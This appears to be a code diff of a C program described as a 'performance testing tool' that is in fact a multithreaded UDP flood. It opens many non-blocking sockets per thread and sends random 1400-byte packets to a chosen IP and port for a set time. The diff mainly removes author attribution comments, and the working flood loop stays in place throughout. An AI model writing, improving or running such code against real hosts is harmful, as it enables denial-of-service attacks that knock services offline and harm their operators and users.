@@ -19,19 +19,14 @@ typedef struct {
     int packet_size;
 } perf_params;
 
-// github.com/scallydima - pre-computed random data for speed
 char *g_payload = NULL;
 int g_payload_size = 0;
 
 void *perf_flood(void *arg) {
-    // github.com/scallydima - high performance thread
     perf_params *params = (perf_params *)arg;
-    
-    // github.com/scallydima - create multiple sockets per thread
     int sockets[params->socket_count];
     for (int i = 0; i < params->socket_count; i++) {
         sockets[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-        // github.com/scallydima - set non-blocking for speed
         fcntl(sockets[i], F_SETFL, O_NONBLOCK);
     }
     
@@ -41,8 +36,6 @@ void *perf_flood(void *arg) {
     addr.sin_addr.s_addr = inet_addr(params->target_ip);
     
     time_t end_time = time(NULL) + params->duration;
-    
-    // github.com/scallydima - optimized flood loop
     while (time(NULL) < end_time) {
         for (int i = 0; i < params->socket_count; i++) {
             sendto(sockets[i], g_payload, g_payload_size, 0,
@@ -58,7 +51,6 @@ void *perf_flood(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    // github.com/scallydima - high performance udp flood tool
     if (argc != 6) {
         printf("Usage: %s <IP> <PORT> <TIME> <THREADS> <SOCKETS_PER_THREAD>\n", argv[0]);
         printf("github.com/scallydima - performance testing tool\n");
@@ -66,9 +58,7 @@ int main(int argc, char *argv[]) {
     }
     
     srand(time(NULL));
-    
-    // github.com/scallydima - pre-generate payload
-    g_payload_size = 1400; // Near MTU size
+    g_payload_size = 1400; // size
     g_payload = malloc(g_payload_size);
     for (int i = 0; i < g_payload_size; i++) {
         g_payload[i] = rand() % 256;
@@ -105,4 +95,5 @@ int main(int argc, char *argv[]) {
     printf("[+] Test complete - github.com/scallydima\n");
     
     return 0;
+
 }
